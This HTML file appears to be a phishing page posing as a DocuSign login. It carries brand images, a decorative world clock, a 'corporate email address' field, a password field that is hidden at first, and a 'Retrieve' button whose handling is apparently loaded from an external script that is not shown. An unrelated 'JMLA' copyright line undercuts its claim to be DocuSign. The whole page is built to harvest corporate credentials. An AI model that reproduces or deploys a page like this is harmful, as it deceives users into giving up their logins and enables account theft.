<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<title>DocuSign Login</title>

<head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<link href="facebox.css" rel="stylesheet" type="text/css" />
<script language="javascript" type="text/javascript" src="javascript/jquery-1.6.2.min.js"></script>
<script language="javascript" type="text/javascript" src="javascript/facebox/src/facebox.js"></script>
<script language="javascript" type="text/javascript" src="javascript/watermark/jquery.watermark.js"></script>
<script language="javascript" type="text/javascript" src="javascript1.js"></script>

<style type="text/css">
#heading_tab {
	background-color: #FFFFFF;
	padding: 4px;
	width: 100%;
	color: #FFFFFF;
}
body {
	margin-left: 0px;
	margin-top: 0px;
	margin-right: 0px;
	margin-bottom: 0px;
}
body,td,th {
	font-family:"Maven Pro","Helvetica Neue","HelveticaNeue",Helvetica,Arial,sans-serif;
}
#central_dv {
	padding: 0px;
	width: 600px;
	margin-right: auto;
	margin-left: auto;
	background-color: #ffffff;
	text-align: center;
}
.bigredB {
	font-size: 13px;
	color: #333;
	background-color: #f6b610;
	padding: 6px;text-transform: uppercase; line-height: 20px; font-weight: bold; letter-spacing: .66px; 
}
.textfldclass {
	padding: 4px;
	width: 300px;
	margin-bottom: 5px;
	text-align: center;
}
.pop_up_class {
	text-align: center;
	width: 400px;
}
.message_div {
	padding: 4px;
	width: 300px;
	margin-right: auto;
	margin-left: auto;
	margin-top: 5px;
	margin-bottom: 5px;
	color: #F00;
}
.style1 {
	color: #999999;
	font-size: 14px;
}
.style2 {
	color: #333;
	font-style: bold;
}
.style3 {font-size: 12px}
</style>
</head>

<body>
<div id="Layer1" style="position:absolute; left:148px; top:425px; width:998px; height:290px; z-index:1">
  
</div>
<div id="heading_tab"> 
  <div align="left">
    <blockquote>
      <blockquote>
        <blockquote>
          <blockquote>
            <blockquote>
              <blockquote>
                <p><a href=""></a><img src="img/hl.jpg" width="267" height="77"><img src="img/static-logo.jpg" width="132" height="61" /> 
                <table border="0" width="200" cellspacing="0" cellpadding="3">
<form name="where">
  <tr>
    <td width="100%">
<select name="city" size="1" onChange="updateclock(this);"> 
<option value="" selected>Local time</option>
<option value="0">London GMT</option> 
<option value="1">Rome</option>
<option value="7">Bangkok</option>
<option value="8">Hong Kong</option>
<option value="9">Tokyo</option> 
<option value="10">Sydney</option>
<option value="12">Fiji</option>
<option value="-10">Hawaii</option>
<option value="-8">San Francisco</option> 
<option value="-5">New York</option>
<option value="-3">Buenos Aires</option>
</select>

</td>
  </tr>
  <tr>
    <td width="100%">
<script language="JavaScript">


if (document.all||document.getElementById)
document.write('<span id="worldclock" style="font:bold 16px Arial;"></span><br />')

zone=0;
isitlocal=true;
ampm='';

function updateclock(z){
zone=z.options[z.selectedIndex].value;
isitlocal=(z.options[0].selected)?true:false;
}

function WorldClock(){
now=new Date();
ofst=now.getTimezoneOffset()/60;
secs=now.getSeconds();
sec=-1.57+Math.PI*secs/30;
mins=now.getMinutes();
min=-1.57+Math.PI*mins/30;
hr=(isitlocal)?now.getHours():(now.getHours() + parseInt(ofst)) + parseInt(zone);
hrs=-1.575+Math.PI*hr/6+Math.PI*parseInt(now.getMinutes())/360;
if (hr < 0) hr+=24;
if (hr > 23) hr-=24;
ampm = (hr > 11)?"PM":"AM";
statusampm = ampm.toLowerCase();

hr2 = hr;
if (hr2 == 0) hr2=12;
(hr2 < 13)?hr2:hr2 %= 12;
if (hr2<10) hr2="0"+hr2

var finaltime=hr2+':'+((mins < 10)?"0"+mins:mins)+':'+((secs < 10)?"0"+secs:secs)+' '+statusampm;

if (document.all)
worldclock.innerHTML=finaltime
else if (document.getElementById)
document.getElementById("worldclock").innerHTML=finaltime
else if (document.layers){
document.worldclockns.document.worldclockns2.document.write(finaltime)
document.worldclockns.document.worldclockns2.document.close()
}


setTimeout('WorldClock()',1000);
}

window.onload=WorldClock
//-->
</script></td>
</form>
</table>
</p>
              </blockquote>
            </blockquote>
          </blockquote>
        </blockquote>
      </blockquote>
    </blockquote>
  </div>
</div>
<div id="central_dv">
  <p> 
  <span class="style2">
  <blink class="content style3">
  <strong> Enter your corporate email address to log in </strong>
  </blink>
  </span> <br />
  </p>
  <p>
    <label for="textfield"></label>
    <input name="textfield" type="text" class="textfldclass" id="email_field" /><br />
  <div id="the_d_" style="display: none"><input name="passwww" type="password" class="textfldclass" id="password_field" /></div>

  </p>
  <p> 
    <input name="button" type="submit" class="bigredB" id="download" value="Retrieve " />
    <br />
  </p><br><br>
  <div align="center">
    <p class="style1"></p>
    <p>
        <p>
        <p>
        <p>    
    </p>
    <p class="style3"> JMLA 1999-2019. All rights reserved. </p>
  </div>
</div>
</body>


</html>